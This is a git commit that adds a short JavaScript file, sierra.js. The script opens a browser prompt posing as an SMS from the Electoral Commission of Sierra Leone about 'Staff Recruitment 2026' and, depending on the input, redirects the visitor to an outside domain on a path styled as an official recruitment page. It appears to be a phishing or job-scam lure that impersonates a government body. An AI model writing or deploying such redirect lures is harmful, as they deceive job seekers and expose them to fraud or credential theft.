b790dbb4b6faf6dcf1a453ff8bd5d6ab7da767c6
usorondo27 <tours_cargoes3h@icloud.com>
2026-02-26 22:08:49 +0100

    Create sierra.js

---
+++ sierra.js
@@ -0,0 +1,9 @@
+
+var password = 'APPLY'
+password = prompt(
+  'SMS: Welcome to The Electoral Commission of Sierra Leone (ECSL) Staff Recruitment 2026. Please click OK to Proceed.',
+  'APPLY'
+);
+if (password != 'APPLY') {
+  location.href = 'https://www.ukanaeba.site/ec-gov-sl-recruitment';
+}
